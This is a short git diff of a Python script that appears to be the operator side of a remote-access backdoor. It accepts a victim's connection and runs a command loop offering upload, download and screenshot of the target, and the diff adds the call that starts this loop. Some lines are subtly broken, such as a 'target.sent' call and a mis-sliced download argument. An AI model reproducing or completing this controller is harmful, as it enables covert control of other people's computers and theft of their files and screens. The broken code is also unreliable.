@@ -4,7 +4,6 @@ import json
 import os
 import subprocess
 
-
 def data_send(data):
     jsondata = json.dumps(data)
     target.sent(jsondata.encode())
@@ -44,19 +43,14 @@ def t_commun():
 
         if comm == 'exit':
             break
-        
         elif comm == 'clear':
             os.system('clear' if os.name != 'nt' else 'cls')
-        
         elif comm [:3] == 'cd ':
             pass 
-        
         elif comm [:6] == 'upload':
             upload_file(comm[7:])
-        
         elif comm [:8] == 'download':
             download_file(comm[:9])
-        
         elif comm [:10] == 'screenshot':
             f = open('screenshot%d' % (count), 'wb')
             target.settimeout(5)
@@ -94,3 +88,4 @@ sock.listen(5)
 
 target, ip = sock.accept()
 print(colored(f'[+] Connected with: {str(ip)}', 'green'))
+t_commun()
